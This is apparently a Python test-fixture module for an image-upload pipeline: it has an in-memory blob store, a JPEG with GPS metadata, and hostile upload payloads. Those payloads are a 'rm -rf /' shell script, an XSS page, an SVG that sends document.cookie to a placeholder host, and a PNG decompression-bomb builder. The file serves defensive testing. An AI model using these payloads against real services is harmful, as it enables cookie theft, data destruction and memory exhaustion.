"""Test doubles and fixture builders for the upload path.

These ship with the package rather than living in ``vision/tests`` because the
acceptance criteria on this feature are stated in terms of them, and because the
FastAPI app (issue #66) will want the same store double for its own route tests
rather than reinventing one.

:func:`photo_with_location` is the interesting one. "EXIF is stripped" is only
a meaningful assertion if the fixture actually had EXIF to lose, and only a
*sufficient* assertion if the fixture also had the other places a camera writes
location: XMP, and a JPEG comment. This builder attaches all three, so a test
that finds none of them afterwards has proven something.
"""

import struct
import threading
import zlib
from dataclasses import dataclass
from io import BytesIO

from PIL import Image

from chip_chat.vision.store import BlobRef

__all__ = [
    "ELF_BINARY",
    "GPS_LATITUDE_DEGREES",
    "GZIP_ARCHIVE",
    "HTML_PAGE",
    "PDF_DOCUMENT",
    "SHELL_SCRIPT",
    "SVG_WITH_SCRIPT",
    "XMP_LOCATION_MARKER",
    "ZIP_ARCHIVE",
    "InMemoryBlobStore",
    "StoredBlob",
    "photo_with_location",
    "png_declaring",
    "solid_image",
]

GPS_LATITUDE_DEGREES = 41
"""The degrees field of the fixture's GPS tag. Recognisable in a raw byte scan."""

XMP_LOCATION_MARKER = b"exif:GPSLatitude"
"""A string that appears in the fixture's XMP packet and nowhere else."""

JPEG_COMMENT = b"chip-chat-fixture-comment"
"""A JPEG COM segment, the third place metadata hides."""


@dataclass(frozen=True, slots=True)
class StoredBlob:
    """One blob an :class:`InMemoryBlobStore` was asked to write."""

    name: str
    data: bytes
    content_type: str


class InMemoryBlobStore:
    """A :class:`~chip_chat.vision.store.BlobStore` that keeps writes in a dict.

    Refuses to overwrite, exactly as the Azure one does, so a test that expects
    unique names is actually testing for them.
    """

    __slots__ = ("_blobs", "_container", "_lock")

    def __init__(self, container: str = "uploads") -> None:
        """Initialise the store.

        Args:
            container: The container name reported to callers.
        """
        self._container = container
        self._lock = threading.Lock()
        self._blobs: dict[str, StoredBlob] = {}

    @property
    def container(self) -> str:
        return self._container

    def put(self, name: str, data: bytes, *, content_type: str) -> None:
        with self._lock:
            if name in self._blobs:
                raise FileExistsError(name)
            self._blobs[name] = StoredBlob(
                name=name, data=data, content_type=content_type
            )

    def get(self, ref: BlobRef | str) -> StoredBlob:
        """Read one blob back.

        Args:
            ref: The reference, or a bare blob name.

        Returns:
            What was written.

        Raises:
            KeyError: If nothing was written under that name.
        """
        name = ref.name if isinstance(ref, BlobRef) else ref
        with self._lock:
            return self._blobs[name]

    @property
    def names(self) -> tuple[str, ...]:
        """Every blob written, in write order."""
        with self._lock:
            return tuple(self._blobs)

    def __len__(self) -> int:
        with self._lock:
            return len(self._blobs)


def solid_image(
    size: tuple[int, int] = (64, 48),
    *,
    fmt: str = "JPEG",
    colour: tuple[int, int, int] = (120, 90, 60),
    mode: str = "RGB",
) -> bytes:
    """Encode a plain rectangle, with no metadata attached.

    Args:
        size: ``(width, height)`` in pixels.
        fmt: A Pillow format name -- ``JPEG``, ``PNG``, ``WEBP``.
        colour: The fill.
        mode: The image mode; ``RGBA`` to exercise the transparency path.

    Returns:
        The encoded bytes.
    """
    fill: tuple[int, ...] = colour if mode == "RGB" else (*colour, 255)
    image = Image.new(mode, size, fill)
    buffer = BytesIO()
    image.save(buffer, format=fmt)
    return buffer.getvalue()


def photo_with_location(
    size: tuple[int, int] = (64, 48), *, orientation: int = 1
) -> bytes:
    """Encode a JPEG carrying location data in all three places a camera writes it.

    EXIF GPS tags, an XMP packet, and a JPEG comment. A normalized copy of this
    that still contains any of them has not had its metadata stripped, whatever
    :meth:`~PIL.Image.Image.getexif` reports.

    Args:
        size: ``(width, height)`` in pixels.
        orientation: The EXIF orientation tag to record. 6 means "rotate 90
            degrees clockwise to display", which is what a phone held upright
            writes, and is the value that proves the transpose ran.

    Returns:
        The encoded JPEG bytes.
    """
    image = Image.new("RGB", size, (200, 40, 40))
    # One corner in a different colour, so a transpose is visible in the pixels
    # rather than only in a tag that the transpose is supposed to remove.
    image.paste((20, 20, 220), (0, 0, max(1, size[0] // 4), max(1, size[1] // 4)))

    exif = Image.Exif()
    exif[0x0112] = orientation  # Orientation
    exif[0x010F] = "ChipChatFixtures"  # Make
    exif[0x8825] = {  # GPSInfo
        1: "N",
        2: (GPS_LATITUDE_DEGREES, 52, 0),
        3: "W",
        4: (87, 37, 0),
    }

    xmp = (
        b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>'
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:exif="http://ns.adobe.com/exif/1.0/" '
        b'exif:GPSLatitude="41,52.000000N" exif:GPSLongitude="87,37.000000W"/>'
        b'</rdf:RDF></x:xmpmeta><?xpacket end="w"?>'
    )

    buffer = BytesIO()
    image.save(
        buffer,
        format="JPEG",
        exif=exif,
        xmp=xmp,
        comment=JPEG_COMMENT,
        quality=95,
    )
    return buffer.getvalue()


# --- payloads that are not photographs ---------------------------------------
#
# Each one is something a real upload endpoint gets sent. They are built here
# rather than checked in as files so that what makes each one dangerous is
# legible in the source rather than in a hexdump. Issue #80 wants the same set.

ZIP_ARCHIVE = b"PK\x03\x04" + b"\x00" * 60
"""A zip. The classic thing to name ``holiday.jpg``."""

GZIP_ARCHIVE = b"\x1f\x8b\x08\x00" + b"\x00" * 32

ELF_BINARY = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
"""A Linux executable, in case anything downstream is ever tempted to run it."""

SHELL_SCRIPT = b"#!/bin/sh\nrm -rf /\n"

HTML_PAGE = b"<!DOCTYPE html><html><body><script>alert(1)</script></body></html>"
"""Served back with the wrong content type, this is stored XSS."""

SVG_WITH_SCRIPT = (
    b'<?xml version="1.0"?>'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b"<script>fetch('https://example.invalid/'+document.cookie)</script>"
    b"</svg>"
)
"""The dangerous one.

SVG genuinely is an image format, browsers render it, and it can carry script
and remote references. It also has no magic number -- it is XML -- so a check
that asks "does this parse as an image" rather than "does this start with a
signature we allow" is exactly the check that lets it through.
"""

PDF_DOCUMENT = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n" + b"\x00" * 32
"""A real document, in a format the pipeline still does not decode."""


def png_declaring(width: int, height: int) -> bytes:
    """Build a tiny PNG whose header claims to be ``width`` by ``height``.

    The decompression bomb, in its honest form: the file is a few hundred bytes,
    the IHDR chunk is truthful PNG, and opening it the naive way asks for the
    memory the header describes. Patching a real PNG's header -- and fixing the
    chunk CRC, so nothing rejects it as merely corrupt -- is how you get a
    fixture that is dangerous for the right reason.

    Args:
        width: The width to declare.
        height: The height to declare.

    Returns:
        PNG bytes with a valid, and enormous, IHDR.
    """
    buffer = BytesIO()
    Image.new("L", (1, 1), 0).save(buffer, format="PNG")
    raw = bytearray(buffer.getvalue())

    # 8-byte signature, then a chunk: 4-byte length, 4-byte type, data, 4-byte CRC.
    # IHDR is always first and always 13 bytes: width, height, then five fields.
    ihdr_data = 8 + 4 + 4
    raw[ihdr_data : ihdr_data + 8] = struct.pack(">II", width, height)
    chunk = bytes(raw[ihdr_data - 4 : ihdr_data + 13])
    raw[ihdr_data + 13 : ihdr_data + 17] = struct.pack(">I", zlib.crc32(chunk))
    return bytes(raw)
